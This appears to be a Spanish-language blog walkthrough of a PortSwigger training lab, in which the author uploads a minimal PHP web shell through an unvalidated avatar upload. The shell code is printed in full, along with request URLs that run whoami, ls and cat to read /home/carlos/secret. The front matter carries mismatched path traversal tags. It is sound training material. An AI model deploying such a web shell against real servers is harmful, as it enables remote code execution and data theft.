---
title: File Upload Vulnerabilities Lab 1
date: 2024-11-24 12:26:00 +0800
author: Justice-Reaper
categories:
  - Portswigger
  - Path Traversal
tags:
  - Path
  - Traversal
  - File
  - path
  - traversal,
  - traversal
  - sequences
  - blocked
  - with
  - absolute
  - path
  - bypass
image:
  path: /assets/img/Path-Traversal-Lab-2/Portswigger.png
---

## Skills

- Remote code execution via web shell upload

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Este `laboratorio` contiene una `función` de carga de imágenes `vulnerable` que no realiza `ninguna validación` en los `archivos` que los usuarios suben antes de almacenarlos en el `sistema` de `archivos` del `servidor`. Para `resolver` el `laboratorio`, debemos `subir` una `web shell` básica en `PHP`, usarla para `extraer` el `contenido` del archivo `/home/carlos/secret` y luego `enviar` este `secreto` utilizando el botón proporcionado en la barra del laboratorio. Podemos `iniciar sesión` en nuestra `cuenta` usando las siguientes credenciales: `wiener:peter`

---
## Web Enumeration

Al `acceder` a la `web` nos sale esto

![[File-Upload-Vulnerabilities-Lab-1/image_1.png]]

Pulsamos en `My account` e `iniciamos sesión` con las credenciales `wiener:peter`

![[File-Upload-Vulnerabilities-Lab-1/image_2.png]]

Vemos que existe un `campo` de `subida` de `archivos`

![[File-Upload-Vulnerabilities-Lab-1/image_3.png]]

Si `inspeccionamos` con donde se `aloja` la `imagen` vemos que es en la ruta `/resources/images`

![[File-Upload-Vulnerabilities-Lab-1/image_4.png]]

Nos `creamos` un `archivo` llamado `shell.php` y lo subimos

```
<?php
    echo "<pre>" . system($_REQUEST['cmd']) . "</pre>";
?>
```

Abrimos nuevamente el `inspector` de `chrome` y vemos que el archivo subido se `aloja` en `/files/avatars`

![[File-Upload-Vulnerabilities-Lab-1/image_5.png]]

Si accedemos a `https://0aa000d704efa5eb8202c09f005a0081.web-security-academy.net/files/avatars/shell.php?cmd=whoami` veremos que tenemos un `RCE (Remote Code Execution)`

![[File-Upload-Vulnerabilities-Lab-1/image_6.png]]

Si accedemos a `https://0aa000d704efa5eb8202c09f005a0081.web-security-academy.net/files/avatars/shell.php?cmd=ls%20/home/carlos` vemos un archivo llamado `secret`

![[File-Upload-Vulnerabilities-Lab-1/image_7.png]]

`Leemos` la `información` de ese archivo con `https://0aa000d704efa5eb8202c09f005a0081.web-security-academy.net/files/avatars/shell.php?cmd=cat%20/home/carlos/secret`

![[File-Upload-Vulnerabilities-Lab-1/image_9.png]]

Pulsamos en `Submit solution` y `mandamos` nuestra `solución`

![[File-Upload-Vulnerabilities-Lab-1/image_10.png]]